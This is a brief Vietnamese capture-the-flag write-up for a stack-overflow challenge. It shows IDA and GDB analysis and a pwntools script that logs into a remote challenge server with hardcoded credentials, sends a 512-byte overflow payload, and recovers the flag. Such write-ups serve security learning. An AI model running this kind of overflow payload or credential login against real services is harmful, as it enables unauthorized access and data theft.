![image](https://user-images.githubusercontent.com/82592489/213152351-0a5a6887-1d29-434c-84c8-2e31b326e0b6.png)





Ý tưởng: sử dụng stackoverflow


bỏ vào ida ta được mã giả



![image](https://user-images.githubusercontent.com/82592489/213154991-86f209ad-d132-4f86-99ab-19e14c3256be.png)



sử dụng gdb:

đàu tiên chúng ta kiểm tra các chức năng bảo vệ

![image](https://user-images.githubusercontent.com/82592489/213157219-ce09327b-e339-4036-a31d-7d374e36bc42.png)





đặt breakpoint tại hàm read(flag) trong readflag và hàm read(secret) để lấy địa chỉ

để overflow từ vị trí secret đến flag ta cần 512 bytes


code:


```py
from pwn import *


r = remote("146.190.115.228",9994)
user = b"KCSC_4dm1n1str4t0r"
password = b"wh3r3_1s_th3_fl4g"
pay = b'A'*512
r.recvuntil(b"Username: ")
r.sendline(user)
r.recvuntil(b"Password: ")
r.sendline(password)

r.sendline(pay)
r.interactive()
```

flag: KCSC{w3ll_d0n3_y0u_g0t_my_s3cr3t_n0w_d04942f299}
